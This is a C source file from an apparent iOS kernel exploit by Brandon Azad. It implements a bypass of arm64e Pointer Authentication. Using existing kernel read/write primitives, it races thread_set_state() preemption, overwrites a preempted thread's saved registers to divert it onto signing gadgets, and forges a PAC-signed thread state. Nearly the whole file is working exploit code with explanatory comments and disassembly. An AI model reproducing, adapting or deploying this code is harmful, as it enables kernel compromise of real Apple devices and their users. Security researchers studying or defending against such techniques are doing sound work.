//
//  pac_bypass.c
//  Brandon Azad
//
#include "pac_bypass.h"

#include <mach/mach.h>
#include <pthread.h>
#include <unistd.h>

#include "kernel.h"
#include "kernel_memory.h"
#include "log.h"
#include "parameters.h"
#include "platform.h"


// Read the thread->CpuDatap field.
static uint64_t
thread_cpu_data(uint64_t thread) {
	return kernel_read64(thread + OFFSET(thread, CpuDatap));
}

// Read the cpu_data->cpu_processor field.
static uint64_t
cpu_data_processor(uint64_t cpu_data) {
	return kernel_read64(cpu_data + OFFSET(cpu_data, cpu_processor));
}

// Bind the current thread to the specified processor.
static void
bind_current_thread_to_processor(uint64_t thread, uint64_t processor) {
	// Bind the current thread to the specified processor.
	kernel_write64(thread + OFFSET(thread, bound_processor), processor);
	// Wait for the bind to take effect.
	for (;;) {
		usleep(20 * 1000);
		sched_yield();
		uint64_t cpu_data = thread_cpu_data(thread);
		uint64_t current_processor = cpu_data_processor(cpu_data);
		if (current_processor == processor) {
			return;
		}
	}
}

// State for managing preemption of thread_set_state().
struct thread_set_state_preemption_loop_state {
	_Atomic bool run;
	uint64_t thread[2];
	uint64_t bound_processor;
	_Atomic bool heartbeat[2];
};

// Pin the current thread to a processor and then spin in thread_set_state().
static void
thread_set_state_preemption_loop(unsigned thread_id,
		struct thread_set_state_preemption_loop_state *preemption_state) {
	INFO("thread_set_state thread %u enter", thread_id);
	// Get the address of the current thread.
	uint64_t thread = kernel_current_thread();
	// Bind the current thread to the specified processor.
	bind_current_thread_to_processor(thread, preemption_state->bound_processor);
	// Notify the main thread that we are bound and ready.
	preemption_state->thread[thread_id] = thread;
	// Create the victim thread.
	thread_t victim = MACH_PORT_NULL;
	kern_return_t kr = thread_create(mach_task_self(), &victim);
	if (kr != KERN_SUCCESS) {
		ERROR("Could not create victim thread");
		return;
	}
	// Call thread_set_state() in a tight loop. We hope to be preempted by a FIQ just before
	// the preemption point, which is an unprotected "MOV X30, X8" instruction.
	//
	// If that happens, then we will be able to return to an arbitrary address.
	thread_state_flavor_t flavor = ARM_THREAD_STATE64;
	arm_thread_state64_t state = {};
	mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
	_Atomic bool *run = &preemption_state->run;
	_Atomic bool *heartbeat = &preemption_state->heartbeat[thread_id];
	while (*run) {
		thread_set_state(victim, flavor, (thread_state_t) &state, count);
		*heartbeat = true;
	}
	// Destroy the victim thread.
	mach_port_deallocate(mach_task_self(), victim);
	INFO("thread_set_state thread %u exit", thread_id);
}

// Arguments for thread_set_state_preemption_loop_func().
struct thread_set_state_preemption_loop_args {
	unsigned thread_id;
	struct thread_set_state_preemption_loop_state *preemption_state;
};

// A pthread function for thread_set_state_preemption_loop().
static void *
thread_set_state_preemption_loop_func(void *arg) {
	struct thread_set_state_preemption_loop_args *args = arg;
	thread_set_state_preemption_loop(args->thread_id, args->preemption_state);
	return NULL;
}

void
pac_bypass__sign_thread_state(uint64_t state,
		uint64_t pc, uint32_t cpsr, uint64_t lr,
		uint64_t x16, uint64_t x17) {
	INFO("PAC bypass");

	// We will measure things in units of 10 milliseconds, which is the scheduler quantum.
	mach_timebase_info_data_t timebase;
	mach_timebase_info(&timebase);
	uint32_t quantum_us = 10 * 1000;
	uint64_t quantum_ticks = quantum_us * 1000 * timebase.denom / timebase.numer;

	// Get the current cpu_data and processor. We spin for a bit first to encourage the system
	// to not place us on CPU 0.
	for (uint64_t end = mach_absolute_time() + 3 * quantum_ticks;
			mach_absolute_time() <= end;) {
		// Spin.
	}
	uint64_t thread = kernel_current_thread();
	uint64_t preemption_cpu_data = thread_cpu_data(thread);
	uint64_t preemption_processor = cpu_data_processor(preemption_cpu_data);

	// Start the thread_set_state() preemption loop threads.
	struct thread_set_state_preemption_loop_state preemption_state = {};
	preemption_state.run = true;
	preemption_state.bound_processor = preemption_processor;
	pthread_t pthreads[2] = {};
	struct thread_set_state_preemption_loop_args args[2] = {};
	for (unsigned i = 0; i < 2; i++) {
		args[i].thread_id = i;
		args[i].preemption_state = &preemption_state;
		pthread_create(&pthreads[0], NULL, &thread_set_state_preemption_loop_func, &args[i]);
	}

	// Bind this thread to another processor.
	for (;;) {
		usleep(4 * quantum_us);
		uint64_t current_cpu_data = thread_cpu_data(thread);
		uint64_t current_processor = cpu_data_processor(current_cpu_data);
		if (current_processor != preemption_processor) {
			bind_current_thread_to_processor(thread, current_processor);
			break;
		}
	}

	// Wait for the threads to start running.
	while (preemption_state.thread[0] == 0 || preemption_state.thread[1] == 0) {
		usleep(2 * quantum_us);
	}

	// Fault in the fake state in case it was allocated with mach_vm_allocate().
	kernel_write64(state + offsetof(struct arm64e_saved_state, pac_signature), 0);

	// Map the cpu_data->cpu_int_state field into userspace so that we can access it quickly.
	// TODO: This does not work for CPU 0.
	volatile uint64_t *cpu_int_state_ptr = kernel_vm_remap(preemption_cpu_data
			+ OFFSET(cpu_data, cpu_int_state), sizeof(uint64_t));

	// We have two threads contending for the same CPU core that are repeatedly calling
	// thread_set_state() and each being preempted by the other. Repeatedly observe the value
	// of cpu_int_state to see if thread_set_state() was preempted at the right point to bypass
	// PAC. We'll keep trying to win the race until we've managed to get a thread stuck in a
	// loop on a gadget that calls ml_sign_thread_state().
	//
	// The preempted kernel thread will only remain preempted long enough to serve the
	// interrupt; if preempted by a FIQ because its quantum is done, it will be allowed to
	// finish its kernel stack before control is transferred to the other thread for the next
	// quantum. Thus, it is critically important that we detect the interrupt and modify the
	// preempted thread's kernel state as quickly as possible.
	//
	// In order to give ourselves the best chance of success, we will only process an interrupt
	// if we observe the transition of cpu_int_state between two adjacent reads. That is, if
	// we read cpu_int_state == X, perform some work, then read cpu_int_state == Y, we will not
	// consider this a valid interrupt state transition, because we might already be close to
	// the end of the interrupt processing by the time we observe the change.
	//
	// Note: Ideally we would map each thread's stack into userspace just like the cpu_data's
	// cpu_int_stack field, allowing us to read and write the preempted kernel thread's saved
	// state (which is stored on its kernel stack) without having to go through the syscall
	// overhead. However, for an unknown reason, mapping kernel thread stacks into userspace
	// produces strange results: Once the thread's originally-mapped kernel stack is replaced
	// (and possibly deallocated, perhaps while still mapped in userspace), deallocating that
	// mapping in userspace seems to create a VM hole without actually removing the mapping,
	// and remapping the new kernel stack will cause the new mapping to be placed in that same
	// virtual memory hole where the original mappin once lived, except with the original
	// mapping still in place. Even allocating memory in that hole using mach_vm_allocate()
	// will leave the original stack mapping in place. Furthermore, if the process exits in
	// this state, it will cause a kernel panic. I have so far not been able to figure out why
	// the system is behaving like this, and so reading and writing the stack via a syscall is
	// a workaround.
	uint64_t cpu_int_state, prev_cpu_int_state;

	// If we've just performed a lot of work, then we need to observe a fresh value for
	// cpu_int_state before we can claim to have seen a transition.
cpu_int_state_retry_full_transition:
	asm volatile("dsb sy");
	cpu_int_state = *cpu_int_state_ptr;

	// Read cpu_data->cpu_int_state. We're hoping to observe a transition that indicates that
	// the preemption processor has just hit an interrupt.
cpu_int_state_check_transition:
	prev_cpu_int_state = cpu_int_state;
	asm volatile("dsb sy");
	cpu_int_state = *cpu_int_state_ptr;

	// If cpu_int_state is 0, then the kernel thread is not currently preempted at an
	// interrupt. If cpu_int_state is the same value as last time, then we should not process
	// this interrupt.
	if (cpu_int_state == 0 || cpu_int_state == prev_cpu_int_state) {
		goto cpu_int_state_check_transition;
	}

	// We have a new interrupt! Read out the value of PC from the saved state.
	uint64_t preempted_pc = 0;
	bool ok = kernel_read(cpu_int_state + offsetof(struct arm64e_saved_state, pc),
			&preempted_pc, sizeof(uint64_t));
	if (!ok) {
		WARNING("Read failure!");
		goto cpu_int_state_retry_full_transition;
	}

	// Check to see if we're at a preemption point.
	if (preempted_pc != ADDRESS(thread_set_state__preemption_point_1)
			&& preempted_pc != ADDRESS(thread_set_state__preemption_point_2)) {
		goto cpu_int_state_retry_full_transition;
	}

	// Since we just did a syscall, quickly check that we're still preempted. We don't need to
	// issue a "dsb sy" again because the syscall should have synchronized for us.
	uint64_t cpu_int_state_check = *cpu_int_state_ptr;
	if (cpu_int_state_check != cpu_int_state) {
		WARNING("Missed the preemption window!");
		goto cpu_int_state_retry_full_transition;
	}

	// We're at a preemption point! We will resume execution at one of the following points in
	// handle_set_arm64_thread_state():
	//
	// 	FFFFFFF007CD0C6C                 BL              ml_sign_thread_state
	// 	FFFFFFF007CD0C70                 MOV             X30, X8        ;; Point 1
	// 	FFFFFFF007CD0C74                 B               loc_FFFFFFF007CD0CBC
	// 	...
	// 	FFFFFFF007CD0CC8                 RET                            ;; Function return
	// 	...
	// 	FFFFFFF007CD0D58                 BL              ml_sign_thread_state
	// 	FFFFFFF007CD0D5C                 MOV             X30, X8        ;; Point 2
	// 	FFFFFFF007CD0D60                 B               loc_FFFFFFF007CD0BF8
	//
	// Quickly set X8 in the saved state to change the value of LR when
	// handle_set_arm64_thread_state() returns and force the preempted thread to spin on the
	// first gadget. We'll hold off setting arguments until after the thread is spinning.
	//
	// The only potentially dangerous argument for the first gadget is X0, which needs to be a
	// pointer to an arm_saved_state struct. However, X0 retains its value from the preemption
	// point until handle_set_arm64_thread_state() returns, so we do not need to worry about it
	// yet.
	//
	// One other thing to keep in mind with this approach is that the spinning gadget will
	// corrupt the original state's PAC signature. Thus, we need to take care to ensure
	// ml_check_signed_state() is not called after this point.
	ok = kernel_write(cpu_int_state + offsetof(struct arm64e_saved_state, x[8]),
			&ADDRESS(spinning_gadget), sizeof(uint64_t));
	if (!ok) {
		WARNING("Write failure!");
		goto cpu_int_state_retry_full_transition;
	}

	// Check the interrupt state one last time. It's too late at this point to avoid corrupting
	// memory if the interrupt handler has finished, but we can print a warning.
	cpu_int_state_check = *cpu_int_state_ptr;
	INFO("Modified preempted thread state");
	if (cpu_int_state_check != cpu_int_state) {
		WARNING("Possibly missed the preemption window and corrupted memory!");
	}

	// Check to see if one of the threads is spinning in ml_sign_thread_state(). If it is, then
	// neither thread will be running. I'm not sure whether this is due to a scheduler change
	// or because subsequent calls to thread_set_state() in the unmodified thread will block
	// until the spinning thread resumes.
	preemption_state.heartbeat[0] = false;
	preemption_state.heartbeat[1] = false;
	for (uint64_t end = mach_absolute_time() + 2 * quantum_ticks;
			mach_absolute_time() <= end;) {
		if (preemption_state.heartbeat[0] || preemption_state.heartbeat[1]) {
			WARNING("Preempted thread is not spinning!");
			goto cpu_int_state_retry_full_transition;
		}
	}
	INFO("Thread is spinning on the spinning gadget");

	// The original state has been corrupted, so don't call thread_set_state() anymore. It's
	// safe for thread_set_state_preemption_loop() to exit the loop and deallocate the victim
	// thread even with a corrupted state. It will send one final heartbeat before exiting.
	preemption_state.run = false;

	// We'll be preempting the thread and modifying its state a few times, so let's define a
	// function to help with that. This is different than the initial version above (which must
	// be highly optimized), so we don't unify with it.
	//
	// The way this works is as follows: As a default, we will continually smash the
	// preempted state with the values we want, hoping that an interrupt occurs at the right
	// time and our smashing overwrites the saved state. We will also check for an interrupt
	// each iteration. We only stop smashing once we've detected that an interrupt handler has
	// returned sufficiently many times. Once we detect this, we will enter checking mode: we
	// no longer smash the saved state and instead only watch for a transition from running to
	// interrupted and then back to running. After such a transition, we can be sure that the
	// preempted state holds the true register values and not our smashed contents, so we check
	// the state. If the state looks as we want it to, we're done, otherwise we start over from
	// the top.
	//
	// It is safe to indiscriminately smash the preempted state because no other kernel threads
	// will be using that stack, and stuck in the loop as it is, the preempted state will
	// always be stored at the same address.
	uint64_t preempted_state = cpu_int_state;
	void (^modify_preempted_state)(void (^)(void), bool (^)(void))
			= ^(void (^modify_state)(void), bool (^check_state)(void)) {
		for (bool done = false; !done;) {
			// Do an initial read of cpu_int_state.
			bool interrupted = (*cpu_int_state_ptr != 0);
			// We are in smashing mode. Repeatedly smash the saved state until we've
			// returned from an interrupt handler 4 times.
			for (unsigned interrupt_returns = 0; interrupt_returns < 4;) {
				bool prev_interrupted = interrupted;
				interrupted = (*cpu_int_state_ptr != 0);
				// Smash the saved state.
				modify_state();
				// If the core has just returned from an interrupt handler, switch
				// to checking mode.
				if (prev_interrupted && !interrupted) {
					interrupt_returns++;
				}
			}
			// We are now in checking mode. First try to observe running, then
			// preempted, then running. This ensures that the state reflects registers.
			interrupted = (*cpu_int_state_ptr != 0);
			for (unsigned running = 0, preempted = 0; running < 2 || preempted < 1;) {
				bool prev_interrupted = interrupted;
				interrupted = (*cpu_int_state_ptr != 0);
				if (prev_interrupted && !interrupted) {
					running++;
				} else if (!prev_interrupted && interrupted) {
					preempted++;
				}
			}
			// Now that the true register state is spilled to memory, check it. If the
			// state is valid, we're done.
			done = check_state();
		}
	};

	// Alright, one of the threads is spinning in the kernel on the first gadget, the spinning
	// gadget:
	//
	// 	FFFFFFF007CCFF20                 MOV             X6, X30
	// 	FFFFFFF007CCFF24                 BL              ml_sign_thread_state
	// 	FFFFFFF007CCFF28                 MOV             X30, X6
	// 	FFFFFFF007CCFF2C                 RET
	//
	// We can't spin on ml_sign_thread_state() directly because it clobbers X1, which is the PC
	// we want to sign, meaning that if we were to set the arguments directly, the correct
	// signature for the values we want would be immediately overwritten with a signature on a
	// garbage PC value once ml_sign_thread_state() is called a second time. Instead, we need
	// to spin on a gadget that calls ml_sign_thread_state() repeatedly while restoring X1 each
	// time.
	//
	// The best candidate for that is the signing gadget, seen below. Unfortunately, we can't
	// directly use that gadget either, because that gadget uses X8 as the return address and
	// handle_set_arm64_thread_state() clobbers X8 when it returns.
	//
	// Thus, I've chosen to spin on this gadget as an intermediate. Even though this gadget
	// also calls ml_sign_thread_state(), it is not stable: just like ml_sign_thread_state()
	// itself, X1 will change on each iteration, rendering the signatures produced useless.
	// However, unlike spinning on ml_sign_thread_state(), we can redirect control flow away
	// from this gadget after it's spinning by modifying an unprotected register.
	//
	// This allows us to safely set the values of X0, X2, X3, X4, X5, and X9 (the arguments to
	// ml_sign_thread_state() needed for the second signing gadget), check that our
	// modifications were successful, and then set X6 to the address of the second signing
	// gadget, which will produce a stable signature.
	//
	// We also need to be careful with X2, which holds CPSR, because ml_sign_thread_state()
	// clears the carry flag before signing and leaves the modified CPSR value in X2.
	uint64_t signed_cpsr = cpsr & ~0x20000000;
	modify_preempted_state(^{
		// Clobber the target registers.
		uint64_t x0_to_x5[6] = { state, 0, signed_cpsr, lr, x16, x17 };
		kernel_write(preempted_state + offsetof(struct arm64e_saved_state, x[0]),
				x0_to_x5, sizeof(x0_to_x5));
		uint64_t x8_to_x9[2] = { ADDRESS(signing_gadget), pc };
		kernel_write(preempted_state + offsetof(struct arm64e_saved_state, x[8]),
				x8_to_x9, sizeof(x8_to_x9));
	}, ^bool {
		// Check that the registers are as expected.
		uint64_t x[10] = {};
		bool ok = kernel_read(preempted_state + offsetof(struct arm64e_saved_state, x[0]),
				x, sizeof(x));
		return (ok && x[0] == state && x[2] == signed_cpsr && x[3] == lr && x[4] == x16
				&& x[5] == x17 && x[8] == ADDRESS(signing_gadget) && x[9] == pc);
	});
	INFO("Set register state for the signing gadget");

	// Now that we've successfully set X0, X2, X3, X4, X5, X8, and X9, we can set X6 to jump to
	// the second signing gadget.
	//
	// The second signing gadget is a stable wrapper around ml_sign_thread_state(). This means
	// that on every loop it will restore X1 before it calls ml_sign_thread_state(), meaning
	// the signature that gets written to the saved state will remain fixed.
	//
	// 	FFFFFFF007CD29A0                 MOV             X1, X9
	// 	FFFFFFF007CD29A4                 STR             X1, [X0,#arm_context._pc]
	// 	FFFFFFF007CD29A8                 BL              ml_sign_thread_state
	// 	FFFFFFF007CD29AC                 MOV             X30, X8
	// 	FFFFFFF007CD29B0                 RET
	//
	// Once we detect that the PC in the preempted thread state is inside this gadget, we can
	// be sure that ml_sign_thread_state() will have produced the proper signature by the time
	// we hijack X8 one final time to resume normal execution.
	modify_preempted_state(^{
		// Clobber X6.
		kernel_write(preempted_state + offsetof(struct arm64e_saved_state, x[6]),
				&ADDRESS(signing_gadget), sizeof(uint64_t));
	}, ^bool {
		// Check if we are executing the new gadget.
		uint64_t preempted_pc = -1;
		kernel_read(preempted_state + offsetof(struct arm64e_saved_state, pc),
				&preempted_pc, sizeof(uint64_t));
		return (ADDRESS(signing_gadget) <= preempted_pc
				&& preempted_pc <= ADDRESS(signing_gadget_end));
	});
	INFO("Thread is spinning on the signing gadget");

	// Now that we've generated the signature, we need to win the preemption race one more time
	// to make the thread return back to userspace. Because successfully overwriting the
	// preempted state will break us out of the infinite loop, it's no longer safe to
	// indiscriminately smash the stack like we did in modify_preempted_state(). Thus, once
	// again we unroll the loop in order to be a bit more precise.
	//
	// We repeatedly observe the value of cpu_int_state to try and find the "leading edge" of
	// an interrupt as quickly as possible. Once we observe a fresh transition to a preempted
	// state, we overwrite X8 with the address to which handle_set_arm64_thread_state() would
	// have returned if we hadn't hijacked LR. This allows the thread to return to userspace
	// and resume executing.
	//
	// We can detect whether we were successful by waiting for the heartbeats generated by the
	// two threads to resume. If they don't resume within half a quantum, then we probably
	// failed.
cpu_int_state_retry_full_transition__resume:
	asm volatile("dsb sy");
	cpu_int_state = *cpu_int_state_ptr;

	// Read cpu_data->cpu_int_state. We're hoping to observe a transition that indicates that
	// the preemption processor has just hit an interrupt.
cpu_int_state_check_transition__resume:
	prev_cpu_int_state = cpu_int_state;
	asm volatile("dsb sy");
	cpu_int_state = *cpu_int_state_ptr;

	// If cpu_int_state is 0, then the kernel thread is not currently preempted at an
	// interrupt. If cpu_int_state is the same value as last time, then we should not process
	// this interrupt.
	if (cpu_int_state == 0 || cpu_int_state == prev_cpu_int_state) {
		goto cpu_int_state_check_transition__resume;
	}

	// We have a new interrupt! Since we should be spinning in the signing gadget right now and
	// the signing gadget doesn't change the stack, we fully expect cpu_int_state to exactly
	// match the original preempted_state address.
	if (cpu_int_state != preempted_state) {
		WARNING("Preempted state at an unexpected address! Checking for heartbeats");
		goto check_for_heartbeats;
	}

	// We're preempted at the signing gadget, so clobber X8 so that the signing gadget's RET
	// will return to the instruction in machine_thread_set_state() that
	// handle_set_arm64_thread_state() originally should have returned.
	ok = kernel_write(cpu_int_state + offsetof(struct arm64e_saved_state, x[8]),
			&ADDRESS(thread_set_state__preemption_resume), sizeof(uint64_t));
	if (!ok) {
		WARNING("Write failure!");
		goto cpu_int_state_retry_full_transition__resume;
	}

	// We've overwritten X8; if we weren't too late, the signing gadget will return to
	// machine_thread_set_state() and normal execution will resume. Wait for a final heartbeat
	// for one and a half quanta.
check_for_heartbeats:
	for (uint64_t end = mach_absolute_time() + 3 * quantum_ticks / 2;;) {
		if (preemption_state.heartbeat[0] && preemption_state.heartbeat[1]) {
			// We've resumed! This final heartbeat is sent as the thread exits.
			break;
		}
		if (mach_absolute_time() > end) {
			// Looks like we lost the race; retry.
			WARNING("Resume failed!");
			goto cpu_int_state_retry_full_transition__resume;
		}
	}
	INFO("Resumed normal execution");

	// Finally, we've forged thread state and resumed normal execution in userspace! Clean up
	// state.
	kernel_vm_unmap((void *) cpu_int_state_ptr, sizeof(uint64_t));
	for (unsigned i = 0; i < 2; i++) {
		pthread_join(pthreads[i], NULL);
	}
	kernel_write64(thread + OFFSET(thread, bound_processor), 0);

	INFO("PAC bypass done");
}
